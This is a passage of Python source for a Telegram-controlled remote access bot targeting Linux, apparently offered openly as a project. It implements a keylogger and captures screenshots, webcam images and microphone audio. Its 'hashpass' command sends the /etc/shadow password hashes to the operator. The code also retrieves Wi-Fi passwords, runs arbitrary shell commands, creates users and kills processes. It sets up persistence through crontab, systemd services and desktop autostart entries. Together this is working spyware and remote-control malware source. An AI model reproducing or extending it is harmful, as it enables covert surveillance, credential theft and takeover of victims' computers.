            return f'service is restarted ({name}) [+]' if shell(f'systemctl restart {quote(name)}') else f'failed to restart service ({name}) [-]'
        case 'stop':
            if not exist():
                return f'service does not exist ({name}) [*]'
            
            return f'service is stopped ({name}) [+]' if shell(f'systemctl stop {quote(name)}') else f'failed to stop service ({name}) [-]'


def crontab(mode, name=None, event=None, root=True, path=None, args='none'):
    init_user()

    if not os.path.isfile(PATH_CRONTAB):
        raise RuntimeError('crontab is not working')
    
    match mode:
        case 'get':
            tasks = []

            for line in read_file(PATH_CRONTAB).splitlines():
                n = line.split('#=')
                
                if len(n) != 2:
                    continue

                tasks.append([n[1].strip(), n[0].strip()])
            
            return tasks
        case 'create':
            if os.path.exists(path):
                path = os.path.realpath(path)

            task = f'{event} {"root" if root else LOGGED_USER} "{path}" {"" if args == "none" else args} #={name}'
            
            return f'task is created ({name}) in crontab [+]' if change_file(PATH_CRONTAB, f'#={name}', task) else f'failed to create task ({name}) in crontab [-]'
        case 'delete':
            task = f'#={name}'

            return f'task is deleted ({name}) in crontab [+]' if change_file(PATH_CRONTAB, task, task, delete=True) else f'failed to delete task ({name}) in crontab [-]'
            

def startup(mode, name=None, path=None, args='none'):
    init_user()

    if not os.path.isdir(PATH_CONF_STARTUP):
        shell(f'sudo -u {quote(LOGGED_USER)} mkdir -p {quote(PATH_CONF_STARTUP)}')

    if not os.path.isdir(PATH_CONF_STARTUP):
        raise RuntimeError(f'startup is not working')  

    match mode:
        case 'get':
            with StringIO() as buf:
                for n in os.listdir(PATH_CONF_STARTUP):
                    if not n.endswith('.desktop'):
                        continue

                    buf.write(f'NAME: {n.removesuffix(".desktop")}\n\n')
                
                return buf.getvalue()
        case 'create':
            path_name = os.path.join(PATH_CONF_STARTUP, f'{name}.desktop')

            if os.path.isfile(path):
                path = os.path.realpath(path)

            with open(path_name, 'w') as f:
                f.write(f'''[Desktop Entry]
Type=Application
Exec="{path}" {"" if args == "none" else args}
Name={name}
''')    
            os.chmod(path_name, 0o755)
            
            return f'created ({name}) in startup [+]'
        case 'delete':
            path_name = os.path.join(PATH_CONF_STARTUP, f'{name}.desktop')

            if os.path.isfile(path_name):
                os.remove(path_name)
                return f'deleted ({name}) in startup [+]'
            else:
                return f'file does not exist ({name}) in startup [*]'
        case 'start':
            path_name = os.path.join(PATH_CONF_STARTUP, f'{name}.desktop')

            if not os.path.isfile(path_name):
                return f'file does not exist ({name}) in startup [*]'

            return f'started ({name}) in startup [+]' if shell(f'xdg-open {quote(path_name)}') else f'failed to start ({name}) in startup [-]'


def env(mode, ekey=None, evalue=None):
    if not os.path.isfile(PATH_ENVIRONMENT):
        raise RuntimeError(f'environment is not working')  
    
    match mode:
        case 'get' | 'query':
            with StringIO() as buf:
                for line in read_file(PATH_ENVIRONMENT).splitlines():
                    line = line.strip()

                    if not line or line.startswith('#'):
                        continue

                    n = line.split('=', 1)

                    if len(n) != 2:
                        continue

                    name, value = n

                    comment_index = value.rfind('#')

                    if comment_index != -1:
                        value = value[:comment_index].strip()

                    if mode == 'query':
                        if ekey == name:
                            return f'{name}={value}\n'
                    else: 
                        buf.write(f'{name}={value}\n')

                return buf.getvalue()
        case 'create':
            return f'environment key is created ({ekey}={evalue}) [+]' if change_file(PATH_ENVIRONMENT, ekey, f'{ekey}={evalue}') else f'failed to create environment key ({ekey}) [-]'
        case 'delete':
            return f'environment key is deleted ({ekey}) [+]' if change_file(PATH_ENVIRONMENT, ekey, ekey, delete=True) else f'environment key does not exist ({ekey}) [*]'


def user(mode, name=None, password='none'):
    match mode:
        case 'get':
            with StringIO() as buf:
                ruser = get_user(name)

                if not ruser:
                    return ''
                
                for n in ruser:
                    buf.write(f'NAME: {n[0]}\nUID: {n[1]}\nGID: {n[2]}\nDIR: {n[3]}\nSHELL: {n[4]}\n\n')
                    
                return buf.getvalue()
        case 'create':
            useradd = shell(f'useradd {quote(name)}')

            if password != 'none':
                try:
                    sp_run(f'passwd {quote(name)}', input=f'{password}\n{password}', text=True, stdout=DEVNULL, stderr=DEVNULL, shell=True)
                except:
                    return f'failed to set user ({name}) password ({password}) [*]'
                
            return f'user is created ({name}) [+]' if useradd else f'failed to create user ({name}) [-]'
        case 'delete':
            return f'user is deleted ({name}) [+]' if shell(f'userdel {quote(name)}') else f'failed to delete user ({name}) [-]'


def app_blocker():
    while True:
        sleep(3)

        if not os.path.isfile(FILE_APP_BLOCKER):
            continue
        
        try:
            blocked_app = read_file(FILE_APP_BLOCKER)

            if not blocked_app:
                continue

            for line in decrypt(blocked_app).splitlines():
                n = line.split('=')

                if len(n) == 2:
                    kill(n[0])
        except:
            continue


def ps():
    process = []

    for n in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info', 'create_time', 'status']):
        proc_pid = n.info.get('pid', NULL)
        proc_cpu =  n.info.get('cpu_percent', NULL)
        proc_mem = n.info.get('memory_info', NULL)
        proc_time = n.info.get('create_time', NULL)

        if (proc_cpu != NULL) and (proc_cpu is not None):
            proc_cpu = f'{int(proc_cpu)}%'

        if (proc_mem != NULL) and (proc_mem.rss is not None):
            proc_mem = f'{proc_mem.rss >> 10} KB'

        if (proc_time != NULL) and (proc_time is not None):
            proc_time = str(timedelta(seconds=int(time() - proc_time)))

        process.append([
            proc_pid,
            n.info.get('name', NULL),
            n.info.get('username', NULL),
            proc_cpu,
            proc_mem,
            proc_time,
            n.info.get('status', NULL).upper()
        ])

    return process


def kill(proc):
    killed = False

    if proc.isdigit():
        try:
            psutil.Process(int(proc)).kill()
        except: ...
        else:
            killed = True
    else:
        if shell(f'pkill -9 {quote(proc)}'):
            killed = True
     
    return killed


def launch(path, args):
    if not os.path.exists(path):
        path = os.path.join(PATH_SHARE, path)

        if not os.path.exists(path):
            return None
        
    try:
        Popen([
                os.path.realpath(path) if os.path.isfile(path) and os.access(path, os.X_OK) 
                else 'xdg-open'
            ] + split_args(args), 
            stdout=DEVNULL, 
            stderr=DEVNULL,
            start_new_session=True
        ) 
    except:
        return False
    else:
        return True


def screenshot():
    try:
        with mss() as sct:
            monitor = sct.monitors[0]  
            img = sct.grab(monitor)
            return memoryview(to_png(img.rgb, img.size))
    except:
        return None


def webcam_screenshot():
    try:
        (
            ffmpeg
            .input(
                '/dev/video0',
                format='v4l2',
                framerate=30,
                video_size='640x480'   
            )
            .output(
                FILE_WEBCAM_SCREENSHOT,
                vframes=1,
                format='image2',       
                vcodec='png'          
            )
            .overwrite_output()
            .run(quiet=True)
        )

        webcam_screenshot_bytes = read_file(FILE_WEBCAM_SCREENSHOT, b=True)

        if os.path.isfile(FILE_WEBCAM_SCREENSHOT):
            os.remove(FILE_WEBCAM_SCREENSHOT)

        return webcam_screenshot_bytes
    except:
        return None


def get_audio_alsa(output=False):
    dtype = 'output' if output else 'input'

    alsa_default = ['default', 'pulse']
    
    pactl = shell('pactl list sources short', output=True)

    if pactl is not None:
        for line in pactl.splitlines():
            n = line.split()

            if len(n) < 3:
                continue

            name = n[1].strip()

            if dtype in name:
                return [name, 'pulse']
        
    pw_cli = shell('pw-cli ls Node', output=True)

    if pw_cli is None:
        return alsa_default

    for line in pw_cli.splitlines():
        n = line.split()

        if (len(n) != 3) or (n[0] != 'node.name'):
            continue

        name = n[-1].replace('"', '').strip()

        if dtype in name:
            return [name, 'pipewire']

    return alsa_default
    

def audio(mode, second):
    alsa_device, dtype = get_audio_alsa(mode == 'system')

    try:
        (
            ffmpeg
            .input(alsa_device, format=dtype, t=second)  
            .output(FILE_AUDIO, acodec='libmp3lame')
            .overwrite_output()
            .run(quiet=True)
        )

        audio_bytes = read_file(FILE_AUDIO, b=True)

        if os.path.isfile(FILE_AUDIO):
            os.remove(FILE_AUDIO)

        return audio_bytes
    except:
        return None


def keylogger():
    buffer = StringIO()
    buffer_size = 0
    
    while True:
        sleep(3)

        if not os.path.isfile(FILE_KEYLOGGER_FLAG) or (read_file(FILE_KEYLOGGER_FLAG) != '1'):
            continue
        
        while True:
            if buffer_size == KEYLOGGER_BUFFER_SIZE:
                with open(FILE_KEYLOGGER, 'a', encoding=FILE_ENCODING) as f:
                    f.write(encrypt(buffer.getvalue()) + '\n') 
                    
                buffer = StringIO()
                buffer_size = 0

                if not os.path.isfile(FILE_KEYLOGGER_FLAG) or (read_file(FILE_KEYLOGGER_FLAG) != '1'):
                    break
    
            try:
                kevent = kb.read_event()
            except:
                continue
            
            if kevent.event_type != 'down':
                continue
            
            buffer.write(f'{kevent.name}\u200F')
            buffer_size += 1


def keylogger_parser(mode):
    KEYBOARD_HOTKEY = {'backspace': '[BACKSPACE]', 'enter': '[ENTER]', 'space': '[SPACE]', 'ctrl': '[CTRL]', 'left ctrl': '[LEFT CTRL]', 'right ctrl': '[RIGHT CTRL]', 'shift': '[SHIFT]', 'left shift': '[LEFT SHIFT]', 'right shift': '[RIGHT SHIFT]', 'alt': '[ALT]', 'left alt': '[LEFT ALT]', 'right alt': '[RIGHT ALT]', 'tab': '[TAB]', 'caps lock': '[CAPS LOCK]', 'up': '[UP]', 'down': '[DOWN]', 'left': '[LEFT]', 'right': '[RIGHT]', 'insert': '[INSERT]', 'home': '[HOME]', 'page up': '[PAGE UP]', 'page down': '[PAGE DOWN]', 'delete': '[DELETE]', 'decimal': '[DECIMAL]', 'end': '[END]', 'print screen': '[PRINT SCREEN]', 'scroll lock': '[SCROLL LOCK]', 'pause': '[PAUSE]', 'num lock': '[NUM LOCK]', 'clear': '[CLEAR]', 'esc': '[ESC]', 'f1': '[F1]', 'f2': '[F2]', 'f3': '[F3]', 'f4': '[F4]', 'f5': '[F5]', 'f6': '[F6]', 'f7': '[F7]', 'f8': '[F8]', 'f9': '[F9]', 'f10': '[F10]', 'f11': '[F11]', 'f12': '[F12]', 'windows': '[WINDOWS]', 'left windows': '[LEFT WINDOWS]', 'right windows': '[RIGHT WINDOWS]', 'num 0': '[NUM 0]', 'num 1': '[NUM 1]', 'num 2': '[NUM 2]', 'num 3': '[NUM 3]', 'num 4': '[NUM 4]', 'num 5': '[NUM 5]', 'num 6': '[NUM 6]', 'num 7': '[NUM 7]', 'num 8': '[NUM 8]', 'num 9': '[NUM 9]', 'num enter': '[NUM ENTER]', 'num +': '[NUM +]', 'num -': '[NUM -]', 'num *': '[NUM *]', 'num /': '[NUM /]', 'media play/pause': '[MEDIA PLAY/PAUSE]', 'media stop': '[MEDIA STOP]', 'media next': '[MEDIA NEXT]', 'media prev': '[MEDIA PREV]', 'volume up': '[VOLUME UP]', 'volume down': '[VOLUME DOWN]', 'mute': '[MUTE]'}
    KEYBOARD_SPECIAL = {'[ENTER]': '\n', '[SPACE]': ' ', '[TAB]': '\t'}


    def is_char(c):
        return not (c.startswith('[') and c.endswith(']'))
     

    def insert_key(k):
        nonlocal buffer, ptr

        buffer.insert(ptr, k)
        ptr += 1
    

    with BytesIO() as data:
        if not os.path.isfile(FILE_KEYLOGGER):
            return data

        with open(FILE_KEYLOGGER, 'r', encoding=FILE_ENCODING) as f:
            for i in f:
                try:
                    keylogger_data = decrypt(i).split('\u200F')
                except:
                    break

                buffer = []
                ptr = 0

                for n in keylogger_data: 
                    hotkey = KEYBOARD_HOTKEY.get(n)

                    if hotkey is None:
                        insert_key(n)
                        continue

                    if mode in {'base', 'char'}:
                        insert_key(KEYBOARD_SPECIAL.get(hotkey, '' if mode == 'char' else hotkey))
                        continue

                    match hotkey:
                        case '[BACKSPACE]':
                            if ptr > 0:
                                prev = buffer[ptr - 1]

                                if is_char(prev):
                                    ptr -= 1
                                    buffer.pop(ptr)
                        case '[DELETE]':
                            if ptr < len(buffer):
                                nextk = buffer[ptr]

                                if is_char(nextk):
                                    buffer.pop(ptr)
                        case '[LEFT]':
                            if ptr == 0:
                                continue

                            prev = buffer[ptr - 1]

                            if prev == '[CTRL]':
                                while (ptr > 0) and (buffer[ptr - 1] == '[CTRL]'):
                                    buffer.pop(ptr - 1)
                                    ptr -= 1

                                while (ptr > 0) and (buffer[ptr - 1].isspace() or not is_char(buffer[ptr - 1])):
                                    ptr -= 1

                                while (ptr > 0) and (not buffer[ptr - 1].isspace() and is_char(buffer[ptr - 1])):
                                    ptr -= 1
                            else:
                                ptr -= 1
                        case '[RIGHT]':
                            if ptr >= len(buffer):
                                continue

                            cur = buffer[ptr - 1]

                            if cur == '[CTRL]':
                                while (ptr < len(buffer)) and (buffer[ptr - 1] == '[CTRL]'):
                                    buffer.pop(ptr - 1)
                                    ptr -= 1

                                while (ptr < len(buffer)) and buffer[ptr].isspace():
                                    ptr += 1

                                while (ptr < len(buffer)) and is_char(buffer[ptr]) and not buffer[ptr].isspace():
                                    ptr += 1
                            else:
                                ptr += 1
                        case '[CTRL]':
                            insert_key('[CTRL]')                       
                        case _:
                            insert_key(KEYBOARD_SPECIAL.get(hotkey, hotkey if mode == 'hotkey' else ''))

                    ptr = max(0, min(ptr, len(buffer)))

                buffer = ''.join(buffer)

                if mode == 'no hotkey':
                    buffer = buffer.replace('[CTRL]', '')
                
                data.write(buffer.encode())

        return data.getvalue()


def execute(cmd, send):
    cmd_lower = cmd.lower()

    match cmd_lower:
        case 'author': 
            send('''
Hello, welcome to my project!
This project is designed for remote computer access.
This version is (TELEGRAM BOT)
My name is Vladislav Khudash.
You can contact me on GitHub: https://github.com/vk-candpython
''')
            return
        case 'help':
            send('''Core Commands
=============

    Command                   Description
    -------                   -----------   
    author                    Information about creator of this project                                         
    help                      Help menu
    repeat                    Repeat command
    session                   About this session
    getpid                    Current pid
    getuid                    Current user
    setuid                    Set current user UID
    config                    Bot config control
    account                   Control accounts connected to this computer
    autostart                 Bot autostart   
    restart                   Restart bot    
    exit                      Log out of this session
                 

File System Commands 
====================

    Command                   Description
    -------                   -----------                                                                                                                                                        
    pwd                       Get working directory
    cd                        Change directory         
    ls                        Get information about files or dirs in working directory    
    mkfile                    Create file               
    mkdir                     Create dir              
    rn                        Rename file or dir
    rm                        Delete file 
    rmdir                     Delete dir                          
    cp                        Copy file or dir
    mv                        Move file or dir
    chmod                     Change file or dir mode
    hide                      Hide file or dir 
    unhide                    Unhide file or dir                        
    cat                       Download file
    zip                       Make archive current directory
                 
                 
Networking Commands
===================

    Command                   Description
    -------                   -----------         
    inet                      Enable or disable Internet
    ipconfig                  Get network interfaces     
    route                     Get routing table
    arp                       Get host ARP cache                                                                                     
    netstat                   Get network connections
    wifi                      Find Wi-Fi or get Wi-Fi password
    site                      Website utilities

                                 
System Commands                                                    
===============

    Command                   Description
    -------                   -----------      
    dmesg                     Get kernel messages                                                                            
    systeminfo                Get information about computer  
    lshw                      Get information about computer using lshw
    modprobe                  Modprobe utilities
    service                   Service utilities 
    crontab                   Crontab utilities 
    startup                   Startup utilities   
    env                       Environment utilities
    user                      User utilities                 
    block                     Block app utilities    
    ps                        Get information about running processes 
    kill                      Terminate process    
    run                       Launch file     
    cmd                       Execute command in shell     
    time                      Get current time or change current time   
    date                      Get current date or change current date   
    sleep                     Sleep computer
    reboot                    Reboot computer         
    shutdown                  Shutdown computer       

                 
User Interface Commands                                                  
=======================

    Command                   Description
    -------                   -----------
    hashpass                  Dump contents of SHADOW database
    mouse                     Mouse utilities         
    keyboard                  Keyboard utilities                                                                                                                                       
    clipboard                 Clipboard utilities                    
    screen                    Take screenshot of screen 
    webcam                    Take screenshot of webcam
    audio                     Record audio or play audio 
    msg                       Display message                     
    keylogger                 Keylogger utilities   
''', doc='help.txt')
            return
        case 'repeat':
            send('repeat (command) -c (amount) -d (second)  —  Repeat command')
            return
        case 'getpid':
            send(str(PID))
            return
        case 'getuid':
            send(NODE + '\\\\' + USER)
            return
        case 'setuid':
            send('setuid (uid)  —  Set current UID for bot')
            return
        case 'config':
            send('''
config -g  —  Get current bot config\n
config (TOKEN|PASSWORD|SEED) -s (value)  —  Set config option\n
config -r (TOKEN|PASSWORD|SEED)  —  Reset config option
''')
            return
        case 'account':
            send('account -g  —  Get accounts connected to session\n\naccount -d (id)  —  Delete account connected to session')
            return
        case 'autostart':
            send('''
autostart -l  —  Get information about bot autostart\n
autostart -c (name) -p (path) -a (none|args)  —  Create file in bot autostart\n
autostart -d (name)  —  Delete file in bot autostart\n
autostart -r  —  Reset bot autostart
''')
            return
        case 'restart':
            if os.path.isfile(__file__):
                send('bot is restarted [+]')
                os.execv(FILE_PYTHON, [FILE_PYTHON, __file__])
            else:
                send('failed to restart bot [-]')

            return
        case 'pwd':
            send(os.getcwd())
            return
        case 'cd':
            send('cd (path)  —  Change directory')
            return
        case 'ls':
            ls_list = ls()

            send(f'DIRECTORY: {os.getcwd()}\n\n' + tabulate(ls_list, headers=[('NAME'), ('MODE'), ('TYPE'), ('HIDDEN'), ('OWNER'), ('SIZE'), ('TIME')], tablefmt='grid'), doc='ls.txt') if ls_list else send(NULL)
            return
        case 'mkfile':
            send('mkfile (path) -d (data)  —  Create file')
            return
        case 'mkdir':
            send('mkdir (path)  —  Create dir')
            return
        case 'rn':
            send('rn (name) -n (new_name)  —  Rename file or dir')
            return
        case 'rm':
            send('rm (path)  —  Delete file')
            return
        case 'rmdir':
            send('rmdir (path)  —  Delete dir')
            return
        case 'cp':
            send('cp (from_path) -t (to_path)  —  Copy file or dir')
            return
        case 'mv':
            send('mv (from_path) -t (to_path)  —  Move file or dir')
            return
        case 'chmod':
            send('chmod (path) -m (number)  —  Change file or dir mode')
            return
        case 'hide':
            send('hide (path)  —  Hide file or dir')
            return
        case 'unhide':
            send('unhide (path)  —  Unhide file or dir')
            return
        case 'cat':
            send('cat (path)  —  Download file')
            return
        case 'zip':
            current_dir = os.path.split(os.getcwd())[-1]
            zip_path = os.path.join(PATH_TMP, current_dir)

            try:
                shutil.make_archive(zip_path, 'zip', '.')
            except:
                send('failed to make archive [-]') 
                return

            if os.path.isfile(f'{zip_path}.zip'):
                try:
                    send(read_file(f'{zip_path}.zip', b=True), doc=f'{current_dir}.zip')
                except:
                    send('archive size is huge [*]')

                os.remove(f'{zip_path}.zip')

            return
        case 'inet':
            send('inet -e  —  Enable Internet\n\ninet -d  —  Disable Internet')
            return
        case 'ipconfig':
            with StringIO() as buf:
                ipconfig_dict = ipconfig()

                ipconfig_global, ipconfig_local = ipconfig_dict

                if ipconfig_global is not None:
                    buf.write(f'''GLOBAL:
\tIP: {ipconfig_global["ip"]}
\tISP: {ipconfig_global["isp"]}
\tCOUNTRY: {ipconfig_global["country"]}
\tREGION: {ipconfig_global["region"]}
\tCITY: {ipconfig_global["city"]}
\tPOSTAL: {ipconfig_global["postal"]}
\tTIMEZONE: {ipconfig_global["timezone"]}
\tLOCATION: {ipconfig_global["location"]}
''')
            
                if ipconfig_local is not None:
                    buf.write('\nLOCAL:\n')

                    for n in ipconfig_local:
                        buf.write(f'\tADAPTER: {n["name"]}\n\tMAC: {n["mac"]}\n\tIPV4: {n["ipv4"]}\n\tIPV6: {n["ipv6"]}\n\n')

                data = buf.getvalue()

            send(data, doc='ipconfig.txt') if data else send(NULL)
            return
        case 'route':
            with StringIO() as buf:
                route_dict = route()

                if route_dict[0]:
                    buf.write(tabulate(route_dict[0], headers=[('INTERFACE'), ('IPV4-DST'), ('GATEWAY'), ('SRC'), ('PROTOCOL'), ('SCOPE'), ('METRIC')], tablefmt='grid'))
                
                if route_dict[1] is not None:
                    if buf.tell():
                        buf.write('\n\n\n')
    
                    buf.write(tabulate(route_dict[1], headers=[('INTERFACE'), ('IPV6-DST'), ('PREFERENCE'), ('PROTOCOL'), ('METRIC')], tablefmt='grid'))
                
                data = buf.getvalue()

            send(data, doc='route.txt') if data else send(NULL)
            return 
        case 'arp':
            arp_list = arp()

            send(tabulate(arp_list, headers=[('IP'), ('MAC'), ('INTERFACE'), ('STATUS')], tablefmt='grid'), doc='arp.txt') if arp_list else send(NULL)
            return
        case 'netstat':
            netstat_list = netstat()

            send(tabulate(netstat_list, headers=[('PID'), ('PROTOCOL'), ('LOCAL'), ('FOREIGN'), ('STATUS')], tablefmt='grid'), doc='netstat.txt') if netstat_list else send(NULL)
            return
        case 'wifi':
            send('wifi -g  —  Find Wi-Fi\n\nwifi -p  —  Get Wi-Fi password')
            return
        case 'site':
            send('''
site -p (url)  —  Open website\n
site -d (url) -n (name)  —  Download file from website\n
site -l  —  Get blocked sites\n
site -b (domain)  —  Block site\n
site -d (domain)  —  Unblock site\n
site -r  —  Unblock all sites
''')
            return
        case 'dmesg':
            dmesg = shell('dmesg -T', output=True)

            send(dmesg, doc='dmesg.txt') if dmesg else send(NULL)
            return
        case 'systeminfo':
            send(systeminfo(), doc='systeminfo.txt')
            return
        case 'lshw':
            lshw = shell('lshw', output=True)

            send(lshw, doc='lshw.txt') if lshw else send('lshw is not working [*]')
            return
        case 'modprobe':
            send('''
modprobe -g  —  Get modules\n
modprobe -i (name)  —  Install module\n
modprobe -d (name)  —  Delete module
''')
            return
        case 'service':
            send('''
service -g  —  Get information about services\n
service -q (name)  —  Get information about service\n
service -u  —  Update services\n
service -c (name) -d (description) -p (path) -a (args) -u (root|user)  —  Create service\n
service -d (name)  —  Delete service\n
service -e (name)  —  Enable service\n
service -i (name)  —  Disable service\n
service -l (name)  —  Start service\n
service -r (name)  —  Restart service\n
service -s (name)  —  Stop service
''')
            return 
        case 'crontab':
            send('''
crontab -g  —  Get tasks from crontab\n            
crontab -c (name) -e (event) -u (root|user) -p (path) -a (none|args)  —  Create task in crontab\n
crontab -d (name)  —  Delete task from crontab
''')
            return
        case 'startup':
            send('''
startup -g  —  Get information about startup\n
startup -c (name) -p (path) -a (none|args)  —  Create file in startup\n
startup -d (name)  —  Delete file in startup\n
startup -l (name)  —  Start file in startup
''')
            return
        case 'env':
            send('''
env -g  —  Get environment\n
env -q (key)  —  Get value of environment key\n
env -c (key) -v (value)  —  Create environment key\n
env -d (key)  —  Delete environment key\n
env -b  —  Get bot environment\n
env -g (key)  —  Get value of bot environment key\n
env -s (key) -v (value)  —  Set bot environment key
''')
            return
        case 'user':
            send('''
user -g  —  Get information about users\n
user -q (name)  —  Get information about user\n
user -c (name) -p (none|password)  —  Create user\n
user -d (name)  —  Delete user
''')
            return
        case 'block':
            send('''
block -l  —  Get blocked apps\n
block -b (name)  —  Block app\n
block -d (name)  —  Unblock app\n
block -r  —  Unblock all apps
''')
            return
        case 'ps':
            with StringIO() as buf:
                ps_list = ps()

                if not ps_list:
                    send(NULL)
                    return

                for n in ps_list:
                    buf.write(f'''PID: {n[0]}
NAME: {n[1]}
USER: {n[2]}
CPU: {n[3]}
MEMORY: {n[4]}
TIME: {n[5]}
STATUS: {n[6]}\n
''')
            
                send(buf.getvalue(), doc='ps.txt')
                return
        case 'kill':
            send('kill (pid|name)  —  Terminate process')
            return
        case 'run':
            send('run (path) -a (none|args)  —  Launch file')
            return
        case 'cmd':
            send('cmd -e (command)  —  Cmd execute command without output\n\ncmd -g (command)  —  Cmd execute command with output')
            return
        case 'time':
            send('time -g  —  Get time\n\ntime -s (time)  —  Set time')
            return
        case 'date':
            send('date -g  —  Get date\n\ndate -s (date)  —  Set date')
            return
        case 'sleep':
            shell('systemctl suspend')
            return
        case 'reboot':
            shell('reboot')
            return
        case 'shutdown':
            shell('poweroff')
            return
        case 'hashpass':
            try:
                send(read_file(PATH_SHADOW), doc='hashpass.txt')
            except:
                send('failed to hashpass [-]')

            return
        case 'mouse':
            send('''
mouse -p  —  Get current mouse position\n
mouse -x (coordinate) -y (coordinate) -d (delay)  —  Move mouse\n
mouse -l|-r|-m -c (click) -d (delay)  —  Click mouse button\n
mouse -s (amount)  —  Mouse scroll
''')
            return
        case 'keyboard':
            send('''
keyboard -t (text) -d (second)  —  Type on keyboard\n
keyboard -k (key) -p (amount) -d (second)  —  Press key or hotkey on keyboard\n
keyboard -c -k|-h (key) -n (new_key)  —  Remap key or hotkey on keyboard\n
keyboard -b (key)  —  Block key or hotkey on keyboard\n
keyboard -r  —  Reset keyboard settings
''')
            return
        case 'clipboard':
            send('''
clipboard -g  —  Get data from clipboard\n
clipboard -c (data)  —  Copy data to clipboard\n
clipboard -r  —  Clear clipboard
''')
            return
        case 'screen':
            png = screenshot()

            send('failed to take screenshot [-]') if png is None else send(png, doc='screenshot.png')
            return
        case 'webcam':
            png = webcam_screenshot()

            send('failed to take screenshot from webcam [-]') if png is None else send(png, doc='webcam.png')
            return
        case 'audio':
            send('audio (-m|-p) (second)  —  Record audio\n\naudio -s (path)  —  Play audio')
            return
        case 'msg':
            send('msg (-p|-s) (title) -t (text)  —  Display message')
            return
        case 'keylogger':
            send('''
keylogger -g (base|char|hotkey|no hotkey)  —  Get keylogger data\n
keylogger -e  —  Enable keylogger\n
keylogger -d  —  Disable keylogger\n
keylogger -s  —  Keylogger status\n
keylogger -r  —  Reset keylogger data
''')
            return
        
    cmd_lower = cmd_lower.split(maxsplit=1)

    if len(cmd_lower) != 2:
        send(f'command not found ({cmd})')
        return
    
    args = cmd.split(maxsplit=1)[-1]

    match cmd_lower[0]:
        case 'repeat': 
            if exp := parse_cmd(r'(?P<command>.*?)\s*-c\s*(?P<amount>\d+)\s*-d\s*(?P<delay>\d+)', args):
                command, amount, delay = exp['command'], int(exp['amount']), int(exp['delay'])

                send(f'started repeating ({command}) -c ({amount}) -s ({delay}) [*]')

                for n in range(1, amount + 1):
                    try:
                        execute(command, send)
                    except BaseException as error:
                        send(f'failed to repeat command {n} ({command}) [-]\n\n{type(error).__name__}({error})')
                    else:
                        send(f'command is repeated {n} ({command}) [+]')

                    sleep(delay)

                send(f'end of repeat command ({command}) -c ({amount}) -s ({delay}) [*]')
                return
        case 'setuid':
            if exp := parse_cmd(r'(\d+)', args):
                uid = int(exp['uid'])

                try:
                    getpwuid(uid)
                except:
                    send(f'UID does not exist ({uid}) [*]')
                    return

                try:
                    os.seteuid(uid)
                except:
                    send(f'failed to set UID ({uid}) [-]')
                else:
                    send(f'UID is set ({uid}) [+]')

                return
        case 'config':
            if args == '-g':
                send(f'''
#-------------------------|NECESSARILY|-------------------------#
TOKEN = {TOKEN}
PASSWORD = {PASSWORD}
SEED = {SEED}
PATH = {PATH}
#-----------------------------|END|-----------------------------#



#-------------------------|OPTIONAL|-------------------------#
BOT_FILE_NAME = {BOT_FILE_NAME}
BOT_SERVICE_NAME = {BOT_SERVICE_NAME}
BOT_SERVICE_DESCRIPTION = {BOT_SERVICE_DESCRIPTION}
BOT_EXE = {BOT_EXE}
#----------------------------|END|---------------------------#
''')
                return
            elif exp := parse_cmd(r'(?P<const>TOKEN|PASSWORD|SEED)\s*-s\s*(?P<value>.+)', args):
                value = exp['value'] 
            
                match exp['const']:
                    case 'TOKEN':
                        if not http(f'https://api.telegram.org/bot{value}/getMe', json=True).get('ok', False):
                            send('Telegram bot (TOKEN) is invalid')
                            return

                        write_file(CONFIG_TOKEN, encrypt(value))
                        send(f'TOKEN is changed ({TOKEN}) --> ({value}) [+]')
                    case 'PASSWORD':
                        value = sha256(value.encode()).hexdigest()
                        write_file(CONFIG_PASSWORD, encrypt(value))
                        send(f'PASSWORD is changed ({PASSWORD}) --> ({value}) [+]')
                    case 'SEED':
                        if not value.isdigit():
                            send('(SEED) is invalid')
                            return
                        
                        write_file(CONFIG_SEED, value)
                        send(f'SEED is changed ({SEED}) --> ({value}) [+]')
                        
                return
            elif exp := parse_cmd(r'-r\s*(?P<const>TOKEN|PASSWORD|SEED)', args):
                match exp['const']:
                    case 'TOKEN':
                        if os.path.isfile(CONFIG_TOKEN):
                            os.remove(CONFIG_TOKEN)
                            send('reset (TOKEN) [+]')
                    case 'PASSWORD':
                        if os.path.isfile(CONFIG_PASSWORD):
                            os.remove(CONFIG_PASSWORD)
                            send('reset (PASSWORD) [+]')
                    case 'SEED':
                        if os.path.isfile(CONFIG_SEED):
                            os.remove(CONFIG_SEED)
                            send('reset (SEED) [+]')

                return
        case 'account':
            if args == '-g':
                accounts = []

                for n in os.listdir(PATH_MEM):
                    try:
                        name, date = decrypt(read_file(os.path.join(PATH_MEM, n))).split('=')
                        accounts.append([((int(n) ^ KEY[1]) >> KEY[0]), f'@{name}', date])
                    except:
                        continue
                
                send(tabulate(accounts, headers=[('ID'), ('NAME'), ('CONNECTION-DATE')], tablefmt='grid'), doc='account.txt') if accounts else send('no accounts [*]')
                return
            elif exp := parse_cmd(r'-d\s*(?P<id>\d+)', args):
                session_id = int(exp['id'])
                path_id = os.path.join(PATH_MEM, mem_id(session_id))
                
                if os.path.exists(path_id):
                    os.remove(path_id)
                    send(f'account is deleted ({session_id}) [+]')
                else:
                    send(f'failed to delete account ({session_id}) [-]')

                return
        case 'autostart':
            if args == '-l':
                try:
                    autostart_files = decrypt(read_file(FILE_AUTOSTART)).splitlines()
                except:
                    send('no files in bot autostart [*]')
                    return

                bfiles = []
                
                for line in autostart_files:
                    try:
                        bname, bpath, bargs, bdate = line.split('\u200B')
                        bfiles.append([bname, bpath, bargs, bdate])
                    except:
                        continue

                send(tabulate(bfiles, headers=[('NAME'), ('PATH'), ('ARGUMENTS'), ('DATE')], tablefmt='grid'), doc='autostart.txt') if bfiles else send('no files in bot autostart [*]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.+)', args):
                bname, bpath, bargs, date = exp['name'], exp['path'], exp['args'], get_date()

                bpath = os.path.realpath(bpath) if os.path.isfile(bpath) else os.path.join(PATH_SHARE, bpath)
  
                if not os.path.isfile(bpath):
                    send(f'file does not exist ({os.path.split(bpath)[-1]}) [*]')
                    return
 
                if not os.path.isfile(FILE_AUTOSTART):
                    write_file(FILE_AUTOSTART, '')

                send(f'added file ({bname}) in bot autostart [+]' if change_file(FILE_AUTOSTART, bname, f'{bname}\u200B{bpath}\u200B{bargs}\u200B{date[0]} | {date[1]}', enc=True) else f'failed to add file ({bname}) in bot autostart [-]')
                return  
